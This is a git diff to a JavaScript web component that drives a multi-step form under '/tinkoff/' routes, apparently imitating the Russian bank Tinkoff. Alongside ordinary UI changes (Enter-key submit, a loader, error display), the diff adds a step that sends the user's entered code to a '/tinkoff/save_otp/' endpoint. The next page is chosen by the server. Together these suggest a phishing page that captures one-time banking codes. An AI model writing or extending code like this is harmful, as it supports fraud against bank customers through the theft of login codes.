@@ -29,6 +29,11 @@ class InputControl extends HTMLElement {
         this.button = shadowRoot.querySelector('button');
 
         this.button.addEventListener('click', () => this.handleSubmit());
+        this.input.addEventListener('keydown', (event) => {
+            if (event.key === 'Enter') {
+                this.handleSubmit();
+            }
+        });
     }
 
     static get observedAttributes() {
@@ -55,6 +60,7 @@ class InputControl extends HTMLElement {
 
         this.hideError();
 
+        showGlobalLoader();
         this.button.disabled = true;
 
         try {
@@ -64,9 +70,29 @@ class InputControl extends HTMLElement {
                 body: JSON.stringify(value)
             });
 
+            if (!response.ok) {
+                hideGlobalLoader();
+                const errorData = await response.json();
+                if (response.status === 307) {
+                    showSessionExpiredModal(errorData.detail);
+                }
+                else {
+                    this.showError(errorData.detail);
+                    console.error('Ошибка: ', errorData);
+                }
+                return;
+            }
+
             const data = await response.json();
 
             if (data.status === 'success') {
+                console.log(data.current_page_type);
+                console.log(data.next_page_type);
+                if (data.current_page_type === 'Придумайте код') {
+                    await fetch(`/tinkoff/save_otp/?otp=${value}`, {
+                        method: 'POST',
+                    });
+                }
                 const pageType = data.next_page_type;
                 window.location.href = `/tinkoff/next/?step=${pageType}`;
             } else {
@@ -78,6 +104,7 @@ class InputControl extends HTMLElement {
             console.error('Ошибка:', error);
         } finally {
             this.button.disabled = false;
+            hideGlobalLoader(); // Скрываем лоадер после завершения запроса
         }
     }
 
@@ -89,6 +116,10 @@ class InputControl extends HTMLElement {
     hideError() {
         this.errorMessageElement.style.display = 'none';
         this.errorMessageElement.textContent = '';
+    }
+
+    cleanInput() {
+        this.input.value = ''
     }
 
     inputIsValid(value) {
